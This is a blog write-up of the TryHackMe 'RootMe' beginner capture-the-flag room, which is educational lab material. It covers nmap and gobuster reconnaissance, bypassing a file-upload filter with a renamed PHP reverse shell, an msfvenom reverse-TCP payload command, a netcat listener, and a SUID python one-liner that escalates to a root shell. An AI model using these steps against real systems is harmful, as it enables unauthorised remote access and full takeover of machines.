---
layout: post
title: "RootMe"
date: 2023-10-08
categories: ["Hands-on", "TryHackMe"]
tags: ""
---

# Root Me
> A ctf for beginners, can you root me? 

Used: **nmap**, **gobuster**

## Task 2: Reconnaissance

### Nmap
Scanning for services on the target machine for open ports, and service version

```bash
nmap -sV -Pn ip
```

![nmap](/images/rootme/nmap_scan.png)

### GoBuster
Scanning for directories on the web server with gobuster

```bash
gobuster dir -u url -w /usr/share/wordlists/dirb/common.txt
```

After scanning, we found out two interesting directories the panel that allows uploading and the uploads that i believe is the directory where the files uploaded end up in. 

![gobuster](/images/rootme/gobuster.png)


## Task 3: Getting a shell
We can get the shell by using the reverse shell from [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) and modifying the Ip address and the port. 

After uploading, the system does not allow the upload of PHP file so as a next step we can try different format.

![panel](/images/rootme/panel_upload_php_failed.png)

```bash
msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.9.14.150 LPORT=6666 -f elf > shell-x64.elf
```
![msfvenom](/images/rootme/elf_file_upload_works.png)

While the system allowed the upload of the file, it did not run it. We could change the format of PHP to be PH5 by copying the file from pentest reverse shell and change the format by renaming it. We were able to upload it and the next step would be to setup the listening then pressing on the file in the /uploads directory. 

```bash
nc -nvlp 6666
```
Once the listener is setup, we can press on the file and find the flag. I manually attempted to locate the file to get an idea on what is there but you can use the below commant to find it easily. We were able to find the cat.txt in the www directory 

![nc](/images/rootme/nc.png)

```bash
find / -type f -name user.txt 
```

Find arguments explained:
- type f to look for file
- name is user.txt

find a file with the name user.txt

## Task 4: Privillege escalation 
Now that we have the user, we need to escalate our privilege to the root. The task requests us to search for files with SUID permission and check if there is a weird file.

I used the below command to search for all the files with SUID permission that can be run as root. We can find that we can run python as root which means we can escalate our privilege by telling python to run bash as sudo 

```bash
find / -user root -perm /4000
```
![python](/images/rootme/python.png)


```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
![python](/images/rootme/root.png)


